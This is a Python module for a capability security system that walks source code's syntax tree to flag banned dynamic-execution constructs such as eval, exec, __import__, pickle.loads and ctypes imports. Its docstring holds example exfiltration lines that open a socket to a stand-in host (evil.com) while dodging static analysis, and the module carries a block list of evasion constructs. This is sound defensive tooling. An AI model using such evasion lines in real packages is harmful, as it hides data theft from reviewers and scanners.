"""Banned construct detector for Python source code.

This module detects dynamic execution constructs that are banned outright
in the capability security system. These constructs are the primary
mechanism for evading static analysis — an attacker who can't use `eval()`
or `__import__()` must use direct imports, which the capability analyzer
catches trivially.

## Why Ban These Constructs?

Consider an attacker trying to exfiltrate data from a package that
declares zero network capabilities. They can't write:

    import socket  # ← caught by the capability analyzer

So they try:

    __import__("socket").connect(("evil.com", 443))  # ← evades analyzer!

Or even:

    eval("__import__('socket').connect(('evil.com', 443))")

By banning `eval()`, `exec()`, `__import__()`, and similar constructs,
we force the attacker to use direct imports, closing the evasion path.

## Banned Constructs

| Construct | Why Dangerous |
|-----------|--------------|
| eval()    | Executes arbitrary Python from a string |
| exec()    | Executes arbitrary Python statements |
| compile() | Creates code objects from strings |
| __import__() | Imports modules by name, evading static analysis |
| importlib.import_module() | Same, official API |
| getattr() on modules | Dynamic attribute access on modules |
| globals() / locals() | Dict access to scope, enabling injection |
| pickle.loads() | Deserializes arbitrary objects including code |
| marshal.loads() | Deserializes Python bytecode |
| ctypes (import) | Calls arbitrary C functions |

## Exception Process

If a package genuinely needs a banned construct (e.g., the capability
analyzer itself uses `ast.parse()` which internally calls `compile()`),
it must declare the exception in `required_capabilities.json` under
`banned_construct_exceptions` with a justification, and this exception
requires hardware-key-signed approval.
"""

import ast
from dataclasses import dataclass
from pathlib import Path


@dataclass(frozen=True)
class BannedConstructViolation:
    """A banned dynamic execution construct found in source code.

    Attributes:
        construct: The name of the banned construct (e.g., "eval", "exec").
        file:      The source file where the violation was found.
        line:      The line number.
        evidence:  The code pattern that triggered the violation.
    """

    construct: str
    file: str
    line: int
    evidence: str

    def __str__(self) -> str:
        return f"BANNED {self.construct} at {self.file}:{self.line}: {self.evidence}"


# ── Banned built-in function names ────────────────────────────────────
#
# These are the names of built-in functions that are banned when called
# directly. Note that `open` is NOT banned — it's a capability, not an
# evasion vector. `eval`, `exec`, and `compile` ARE banned because they
# enable arbitrary code execution from strings.

_BANNED_BUILTINS: set[str] = {
    "eval",
    "exec",
    "compile",
    "__import__",
}

# ── Banned module-level calls ─────────────────────────────────────────
#
# These are module.function patterns that are banned.

_BANNED_MODULE_CALLS: set[tuple[str, str]] = {
    ("importlib", "import_module"),
    ("pickle", "loads"),
    ("pickle", "load"),
    ("marshal", "loads"),
    ("marshal", "load"),
}

# ── Banned imports ────────────────────────────────────────────────────
#
# Importing these modules is itself a banned construct.

_BANNED_IMPORTS: set[str] = {
    "ctypes",
    "cffi",
}


class BannedConstructDetector(ast.NodeVisitor):
    """Walks a Python AST to detect banned dynamic execution constructs.

    Unlike the CapabilityAnalyzer which maps constructs to capabilities,
    this detector flags constructs that are forbidden regardless of what
    capabilities a package declares. No capability declaration can
    authorize `eval()`.

    Usage:
        tree = ast.parse(source_code)
        detector = BannedConstructDetector("path/to/file.py")
        detector.visit(tree)
        violations = detector.violations
    """

    def __init__(self, filename: str) -> None:
        self.filename = filename
        self.violations: list[BannedConstructViolation] = []

    def _add(self, construct: str, line: int, evidence: str) -> None:
        """Record a banned construct violation."""
        self.violations.append(
            BannedConstructViolation(
                construct=construct,
                file=self.filename,
                line=line,
                evidence=evidence,
            )
        )

    def visit_Call(self, node: ast.Call) -> None:
        """Detect banned function calls.

        Checks for:
        1. Direct banned builtins: eval(...), exec(...), compile(...)
        2. Module-level banned calls: importlib.import_module(...)
        3. getattr() on modules (dynamic attribute access)
        4. globals() and locals() calls
        """
        # Check direct banned builtin calls
        if isinstance(node.func, ast.Name):
            name = node.func.id
            if name in _BANNED_BUILTINS:
                self._add(name, node.lineno, f"{name}(...)")
            elif name == "globals":
                self._add("globals", node.lineno, "globals()")
            elif name == "locals":
                self._add("locals", node.lineno, "locals()")
            elif (
                name == "getattr"
                and len(node.args) >= 2
                and not isinstance(node.args[1], ast.Constant)
            ):
                # getattr is only banned when used on modules — but
                # statically determining the type of the first argument
                # is difficult. We flag all getattr() calls with a
                # non-literal second argument, since those are the
                # dangerous ones (dynamic attribute lookup).
                self._add(
                    "getattr",
                    node.lineno,
                    "getattr(..., <dynamic>)",
                )

        # Check module-level banned calls
        if isinstance(node.func, ast.Attribute) and isinstance(
            node.func.value, ast.Name
        ):
            key = (node.func.value.id, node.func.attr)
            if key in _BANNED_MODULE_CALLS:
                self._add(
                    f"{key[0]}.{key[1]}",
                    node.lineno,
                    f"{key[0]}.{key[1]}(...)",
                )

        self.generic_visit(node)

    def visit_Import(self, node: ast.Import) -> None:
        """Detect banned module imports."""
        for alias in node.names:
            if alias.name in _BANNED_IMPORTS:
                self._add(
                    f"import {alias.name}",
                    node.lineno,
                    f"import {alias.name}",
                )
        self.generic_visit(node)

    def visit_ImportFrom(self, node: ast.ImportFrom) -> None:
        """Detect banned `from X import Y` statements."""
        module = node.module or ""
        if module in _BANNED_IMPORTS:
            names = ", ".join(a.name for a in (node.names or []))
            self._add(
                f"import {module}",
                node.lineno,
                f"from {module} import {names}",
            )

        # Check for `from importlib import import_module`
        if module == "importlib" and node.names:
            for alias in node.names:
                if alias.name == "import_module":
                    self._add(
                        "importlib.import_module",
                        node.lineno,
                        "from importlib import import_module",
                    )

        # Check for `from pickle import loads`
        if module in ("pickle", "marshal") and node.names:
            for alias in node.names:
                if alias.name in ("loads", "load"):
                    self._add(
                        f"{module}.{alias.name}",
                        node.lineno,
                        f"from {module} import {alias.name}",
                    )

        self.generic_visit(node)


def detect_banned_constructs(
    filepath: str | Path,
) -> list[BannedConstructViolation]:
    """Scan a single Python file for banned constructs.

    Args:
        filepath: Path to the Python source file.

    Returns:
        List of banned construct violations found.
    """
    filepath = Path(filepath)
    source = filepath.read_text(encoding="utf-8")
    tree = ast.parse(source, filename=str(filepath))
    detector = BannedConstructDetector(str(filepath))
    detector.visit(tree)
    return detector.violations
